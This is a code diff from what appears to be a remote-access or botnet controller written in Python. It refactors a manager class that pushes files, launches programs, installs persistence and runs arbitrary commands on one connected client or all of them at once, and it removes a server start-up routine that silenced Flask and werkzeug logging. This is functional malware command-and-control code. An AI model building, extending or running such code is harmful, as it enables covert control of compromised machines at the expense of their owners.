@@ -24,19 +24,7 @@ def decodeJwt(token):
     except jwt.exceptions.PyJWTError:
         return None,False
 
-def startServer(app,verbose=False):
-    print("[SERVER] is is starting...")
-    if not verbose:
-        #disables startup message lol
-        cli = sys.modules['flask.cli']
-        cli.show_server_banner = lambda *x: None
-        app.logger.disabled=True
-        log = logging.getLogger('werkzeug')
-        log.disabled = True
-
-    print("[SERVER] has loaded ..")
-    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
-    
+  
 
 class manager:
     def __init__(self):
@@ -106,24 +94,21 @@ class manager:
             for uid in self.clientList:
                 self.clientList[uid].writefile(fname)
         else:
-            if clientuid in self.clientList:
-                self.clientList[clientuid].writefile(fname)
+            self.getClientByIndex(clientuid).writefile(fname)
 
     def executeProgram(self,fname,clientuid=0):
         if clientuid==-1:
             for uid in self.clientList:
                 self.clientList[uid].executeProgram(fname)
         else:
-            if clientuid in self.clientList:
-                self.clientList[clientuid].executeProgram(fname)
+            self.getClientByIndex(clientuid).executeProgram(fname)
 
     def installPersistency(self,clientuid=0):
         if clientuid==-1:
             for uid in self.clientList:
                 self.clientList[uid].installPersistency()
         else:
-            if clientuid in self.clientList:
-                self.clientList[clientuid].installPersistency()
+            self.getClientByIndex(clientuid).installPersistency()
 
     def runCommand(self,cmd,clientuid=0):
         cmdList=[cmd]
@@ -131,8 +116,7 @@ class manager:
             for uid in self.clientList:
                 self.clientList[uid].runCommand(cmdList)
         else:
-            if clientuid in self.clientList:
-                self.clientList[clientuid].runCommand(cmdList)
+            self.getClientByIndex(clientuid).runCommand(cmdList)
     
     def testServer(self):
         return "server ok"
